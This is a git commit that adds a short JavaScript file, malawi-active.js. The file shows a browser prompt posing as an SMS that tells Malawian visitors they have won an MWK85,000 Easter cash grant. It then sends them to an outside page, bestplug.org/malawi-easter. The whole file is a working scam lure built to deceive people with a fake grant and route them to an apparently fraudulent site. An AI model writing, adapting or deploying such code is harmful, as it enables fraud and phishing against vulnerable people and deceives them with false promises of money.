72ecb668e327d401d441ea7bb54769837e1407ac
vibeblog <enom02567@gmail.com>
2025-04-17 06:53:14 +0100

    Create malawi-active.js

---
+++ malawi-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW MWK85,000'
+password=prompt('SMS: Congratulations, you are among the selected Malawian to receive MWK85,000 as Easter Celebration cash grant, Press Ok to withdraw cash Now ','WITHDRAW MWK85,000');
+if (password != 'WITHDRAW MWK85,000') {
+location.href='https://bestplug.org/malawi-easter';
+}
